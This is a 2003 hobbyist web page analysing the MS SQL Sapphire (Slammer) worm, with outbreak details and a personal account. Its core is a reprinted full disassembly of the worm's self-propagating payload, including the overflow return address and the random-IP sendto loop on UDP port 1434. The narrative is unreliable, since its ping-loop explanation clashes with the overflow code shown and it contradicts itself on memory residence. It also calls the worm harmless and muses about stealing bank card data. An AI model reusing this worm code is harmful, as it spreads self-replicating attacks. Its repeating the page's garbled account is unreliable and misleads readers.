<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<!-- saved from url=(0045)http://www.geocities.com/nolege4u/saphire.htm -->
<HTML><HEAD><TITLE>New Page 1</TITLE>
<SCRIPT 
language=JavaScript>var PUpage="76001084"; var PUprop="geocities"; </SCRIPT>

<SCRIPT language=JavaScript src="saphire_files/pu5geo.js"></SCRIPT>

<SCRIPT language=JavaScript src="saphire_files/ygIELib9.js"></SCRIPT>

<SCRIPT language=JavaScript>var yviContents='http://us.toto.geo.yahoo.com/toto?s=76001084&l=NE&b=1&t=1061332334';yviR='us';yfiEA(0);</SCRIPT>
<!-- text above generated by server. PLEASE REMOVE -->
<META http-equiv=Content-Language content=en-us>
<META content="MSHTML 6.00.2600.0" name=GENERATOR>
<META content=FrontPage.Editor.Document name=ProgId>
<META http-equiv=Content-Type content="text/html; charset=windows-1252"></HEAD>
<BODY text=#800000 bgColor=#ffffff>
<TABLE id=AutoNumber3 style="BORDER-COLLAPSE: collapse" borderColor=#111111 
height=117 cellSpacing=0 cellPadding=0 width=781 border=1>
  <TBODY>
  <TR>
    <TD width=781 bgColor=#fff0f0 height=117><FONT 
      size=7>Hackers_Programmers</FONT>
      <P><B>"You need to be a hacker to learn 
hacking"</B></P></TD></TR></TBODY></TABLE>
<HR color=#800000 SIZE=5>

<P align=center><A 
href="http://www.hackersbook.com/click.php?ref=3591&amp;lk=2"><IMG height=40 
src="saphire_files/banner40-ani.gif" width=400></A></P>
<P align=center><B><FONT face="Book Antiqua" color=#ccccff><A 
href="http://www.geocities.com/nolege4u/saphire.htm"><FONT color=#800000>MSSQL 
worm(Saphire worm) Analysis</FONT></A></FONT></B></P>
<P>&nbsp;</P>
<P><FONT face="Book Antiqua">Date of release: 25th Jan 2003<BR>Type: Worm 
<BR>Infection Length: 376 bytes <BR>Systems Affected: Windows NT, Windows 2000, 
Windows XP <BR>Systems Not Affected: Windows 3.x, Windows 95, Windows 98, 
Windows Me, Microsoft IIS, Macintosh, OS/2, UNIX, Linux <BR>Severity: 
High<BR>Port: 1434/udp</FONT></P>
<P><FONT 
face="Book Antiqua">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
The 26th January 2003 Sunday morning newspapers filled there headlines with a 
breaking news of spreading of a new MS SQL worm. When I read it immedietly I 
went to <A href="http://www.cert.org/"><FONT 
color=#800000>www.cert.org</FONT></A> ("Computer Emergency Response Team" in 
action since 1995). It showed the whole statistics and technical details 
regarding that MS SQL worm. I got many emails from lots of system administrators 
showing their firewall logs. The logs showed that their firewall had blocked 
lots of requests from different ip addresses to their 1434 udp port. These 
requests were coming from all over the world. It was clear that a new worm was 
in action. </FONT></P>
<P><FONT 
face="Book Antiqua">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
The worm was spreading so fast that almost in 10 minutes after its release it 
had stretched its arms throughout whole world !!! It was faster than the Code 
Red or any other worm.</FONT></P>
<P><FONT 
face="Book Antiqua">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
The worm scanned random ip addresses and send 376 bytes packets to udp port 
1434. Since it was using udp ports it didn't except to get a reply back from 
remote machine. This is one of the cause for its speed in spreading. The worm 
exploited a vulnerability in MS SQL which caused a Dos attack. SQL Server 
Resolution Service (SSRS) introduced in MS SQL 2000 listens on udp port 1434. 
Whenever a 'ping' request was send to SSRS, it replied to requestor with and 
identical copy of 'ping'. So if a Server A sends a 'ping' request from udp port 
1434 to Server B at udp port 1434, Server B would reply with same 'ping' message 
back to Server A at 1434. As Server A gets 'ping' packet from B again it sends 
'ping' packet to B and so goes on resulting in a Deniel of Service situation. 
</FONT></P>
<P><FONT 
face="Book Antiqua">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
Endless sending of 'ping' packets.</FONT></P>
<P><FONT 
face="Book Antiqua">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
ping packet</FONT><BR><FONT face="Book Antiqua">Server 
A&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
------------------------------------&gt;t;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
Server B</FONT><BR><FONT face="Book Antiqua">Port udp 
1434&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
&lt;------------------------------------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
Port 1434&nbsp; 
</FONT><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
<FONT face="Book Antiqua">ping packet</FONT></P>
<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
<FONT face="Book Antiqua">This jammed the traffic on the internet. My ISP had to 
stop its services for 2-3 hrs. </FONT></P>
<P><B><U><FONT face="Book Antiqua">PLUS Point about Saphire 
worm.</FONT></U></B></P>
<P><FONT 
face="Book Antiqua">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
Unlike other worms this one was not memory resident. Once the server is 
restarted the worm is gone. i.e. It was stored only in the RAM. Actually if the 
coder of the worm wanted, he could have made it more malicious revealing out the 
databases of the servers and its quiet dangerous isn't it. How about exploring 
the banks databases and revealing all credit card info !!! Quiet quiet quiet 
dangerous. Databases really need to be more secured in our attacking cyber 
world. Many ethical hackers and security experts even praised this worm as it 
didn't damage any file or even didn't reside in memory. The coder had no 
intentions of spreading any message or earning fame or any such sort of thing. 
Further it warned the administrators throughout the world that their systems 
were not secured !! It was just a harmless worm. </FONT></P>
<P><FONT 
face="Book Antiqua">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
Eeye Digital Defence team dissambled the worm. The code of the worm is as 
follows:</FONT></P>
<P><FONT face="Book Antiqua">Dissambled virus<BR>~~~~~~~~~~~~~~~~<BR>;SAPPHIRE 
WORM CODE DISASSEMBLED<BR>;eEye Digital Security: January 25, 
2003<BR><BR><BR>push 42B0C9DCh ; [RET] sqlsort.dll -&gt; jmp esp<BR>mov eax, 
1010101h ; Reconstruct session, after the overflow the payload buffer <BR>; 
get's corrupted during program execution but before the <BR>; payload is 
executed. .<BR>xor ecx, ecx<BR>mov cl, 18h<BR><BR>FIXUP:<BR>push eax<BR>loop 
FIXUP<BR>xor eax, 5010101h<BR>push eax<BR>mov ebp, esp<BR>push ecx <BR>push 
6C6C642Eh<BR>push 32336C65h<BR>push 6E72656Bh ; kernel32<BR>push ecx<BR>push 
746E756Fh ; GetTickCount<BR>push 436B6369h<BR>push 54746547h<BR>mov cx, 
6C6Ch<BR>push ecx<BR>push 642E3233h ; ws2_32.dll<BR>push 5F327377h<BR>mov cx, 
7465h<BR>push ecx<BR>push 6B636F73h ; socket<BR>mov cx, 6F74h<BR>push 
ecx<BR>push 646E6573h ; sendto<BR>mov esi, 42AE1018h ; IAT from sqlsort<BR>lea 
eax, [ebp-2Ch] ; (ws2_32.dll)<BR>push eax<BR>call dword ptr [esi] ; call 
loadlibrary<BR>push eax<BR>lea eax, [ebp-20h]<BR>push eax<BR>lea eax, [ebp-10h] 
; (kernel32.dll)<BR>push eax<BR>call dword ptr [esi] ; loadlibrary<BR>push 
eax<BR>mov esi, 42AE1010h ; IAT from sqlsort<BR>mov ebx, [esi]<BR>mov eax, 
[ebx]<BR>cmp eax, 51EC8B55h ; check entry point fingerprint<BR>jz short VALID_GP 
; Check entry point fingerprint for getprocaddress, if it failes <BR>; fall back 
to GetProcAddress entry in another DLL version. <BR>; Undetermined what dll 
versions this will succedd on. Due <BR>; to the lack of reliable importing this 
may not work across all <BR>; dll versions.<BR>mov esi, 42AE101Ch ; IAT entry 
-&gt; 77EA094C<BR><BR>VALID_GP: <BR>call dword ptr [esi] ; 
GetProcAddress<BR>call eax ; return from GetProcaddress = GetTickCount 
entrypoint<BR>xor ecx, ecx<BR>push ecx<BR>push ecx<BR>push eax<BR>xor ecx, 
9B040103h<BR>xor ecx, 1010101h<BR>push ecx ; 9A050002 = port 1434 / 
AF_INET<BR>lea eax, [ebp-34h] ; (socket)<BR>push eax<BR>mov eax, [ebp-40h] ; 
ws2_32 base address<BR>push eax<BR>call dword ptr [esi] ; GetProcAddress<BR>push 
11h<BR>push 2<BR>push 2<BR>call eax ; socket<BR>push eax<BR>lea eax, [ebp-3Ch] ; 
sendto<BR>push eax<BR>mov eax, [ebp-40h] ; ws2_32 base address<BR>push 
eax<BR>call dword ptr [esi] ; GetProcAddress<BR>mov esi, eax ; save sendto -&gt; 
esi<BR>or ebx, ebx <BR>xor ebx, 0FFD9613Ch<BR><BR>PRND: <BR>mov eax, [ebp-4Ch] ; 
Pseudo Random Algorithm Start<BR>lea ecx, [eax+eax*2]<BR>lea edx, 
[eax+ecx*4]<BR>shl edx, 4<BR>add edx, eax<BR>shl edx, 8<BR>sub edx, eax<BR>lea 
eax, [eax+edx*4]<BR>add eax, ebx ; Pseudo Random Algorithm End<BR>mov [ebp-4Ch], 
eax<BR>push 10h<BR>lea eax, [ebp-50h]<BR>push eax<BR>xor ecx, ecx<BR>push 
ecx<BR>xor cx, 178h<BR>push ecx<BR>lea eax, [ebp+3]<BR>push eax<BR>mov eax, 
[ebp-54h]<BR>push eax<BR>call esi ; sendto<BR>jmp short PRND ; Jump back to 
Pseudo Random Algorithm 
Start<BR><BR>--------------------------------------------x-------------------------------------------</FONT></P>
<P><FONT face="Book Antiqua">Chintan Trivedi</FONT><BR><FONT 
face="Book Antiqua"><A href="mailto:chesschintan@hotmail.com"><FONT 
color=#800000>chesschintan@hotmail.com</FONT></A></FONT></P>
<HR color=#800000 SIZE=5>

<P><FONT face="Book Antiqua">Join the group by sending a blank mail to <A 
href="mailto:hackers_programmers@yahoogroups.com">hackers_programmers@yahoogroups.com</A> 
</FONT></P><!-- text below generated by server. PLEASE REMOVE --></OBJECT></LAYER>
<DIV></DIV></SPAN></STYLE></NOSCRIPT></TABLE></SCRIPT></APPLET>
<SCRIPT language=JavaScript src="saphire_files/mc.js"></SCRIPT>

<SCRIPT language=JavaScript src="saphire_files/geov2.js"></SCRIPT>

<SCRIPT language=javascript>geovisit();</SCRIPT>
<NOSCRIPT><IMG height=1 alt=setstats src="saphire_files/visit.gif" width=1 
border=0></NOSCRIPT> <IMG height=1 alt=1 src="saphire_files/serv.gif" width=1> <!-- w38.geo.scd.yahoo.com compressed/chunked Tue Aug 19 15:32:14 PDT 2003 --></BODY></HTML>
